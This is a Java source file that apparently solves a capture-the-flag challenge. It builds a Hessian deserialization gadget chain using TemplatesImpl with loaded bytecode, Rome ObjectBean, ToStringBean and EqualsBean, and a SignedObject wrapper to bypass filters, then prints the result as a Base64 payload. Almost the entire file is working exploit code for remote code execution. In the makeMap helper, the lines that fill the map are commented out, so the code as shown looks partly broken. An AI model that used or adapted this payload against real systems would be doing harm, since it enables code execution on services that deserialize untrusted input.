package com.ctf.ezchain;
import com.caucho.hessian.io.Hessian2Input;
import com.caucho.hessian.io.Hessian2Output;
import com.rometools.rome.feed.impl.ObjectBean;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.rometools.rome.feed.impl.EqualsBean;
import com.rometools.rome.feed.impl.ToStringBean;
//import javassist.*;

import java.io.*;
import java.lang.reflect.Field;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import java.io.ByteArrayOutputStream;
import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.security.*;
import java.util.HashMap;

//import ysoserial.Serializer;

//import ysoserial.payloads.util.Reflections;

import javax.xml.transform.Templates;
import java.util.Base64;

public class HashCodeBypass {

    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static HashMap<Object, Object> makeMap ( Object v1, Object v2 ) throws Exception {
        HashMap<Object, Object> s = new HashMap<>();
        //Reflections.setFieldValue(s, "size", 2);
        Class<?> nodeC;
        try {
            nodeC = Class.forName("java.util.HashMap$Node");
        }
        catch ( ClassNotFoundException e ) {
            nodeC = Class.forName("java.util.HashMap$Entry");
        }
        Constructor<?> nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
        nodeCons.setAccessible(true);

        Object tbl = Array.newInstance(nodeC, 2);
        Array.set(tbl, 0, nodeCons.newInstance(0, v1, v1, null));
        Array.set(tbl, 1, nodeCons.newInstance(0, v2, v2, null));
        //Reflections.setFieldValue(s, "table", tbl);
        return s;
    }

    public static void main(String[] args) throws Exception {

        TemplatesImpl obj = new TemplatesImpl();
        //setFieldValue(obj, "_bytecodes", new byte[][] {ClassPool.getDefault().get(ysoserial.payloads.test2.class.getName()).toBytecode()});

        Class tc = obj.getClass();
        Field bytecodesField = tc.getDeclaredField("_bytecodes");
        bytecodesField.setAccessible(true);
        byte[] code = Files.readAllBytes(Paths.get("C:\\Users\\30389\\Desktop\\CVE\\java_unserialize\\CC1\\target\\classes\\org\\emample\\Test.class"));
        byte[][] codes = {code};
        bytecodesField.set(obj,codes);

        setFieldValue(obj, "_name", "HelloTemplatesImpl");
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());

        ObjectBean delegate = new ObjectBean(Templates.class, obj);
        ObjectBean root  = new ObjectBean(ObjectBean.class, delegate);

        HashMap<Object, Object> hashmap = makeMap(root,root);

        KeyPairGenerator keyPairGenerator = KeyPairGenerator.getInstance("DSA");
        keyPairGenerator.initialize(1024);
        KeyPair keyPair = keyPairGenerator.genKeyPair();
        PrivateKey privateKey = keyPair.getPrivate();
        Signature signature = Signature.getInstance(privateKey.getAlgorithm());
        SignedObject signedObject = new SignedObject(hashmap, privateKey, signature);

        ToStringBean item = new ToStringBean(SignedObject.class, signedObject);
        EqualsBean root1 = new EqualsBean(ToStringBean.class, item);

        HashMap<Object, Object> hashmap1 = makeMap(root1,root1);

        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        Hessian2Output hessian2Output = new Hessian2Output(byteArrayOutputStream);
        hessian2Output.writeObject(hashmap1);
        hessian2Output.flushBuffer();

        byte[] bytes = byteArrayOutputStream.toByteArray();
        String exp = Base64.getEncoder().encodeToString(bytes);
        System.out.println(exp);

//        try {
//            ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes);
//            Hessian2Input hessian2Input = new Hessian2Input(byteArrayInputStream);
//            System.out.println(hessian2Input.readObject());
//        } catch (Exception e) {
//            System.out.println(e);
//        }

    }
}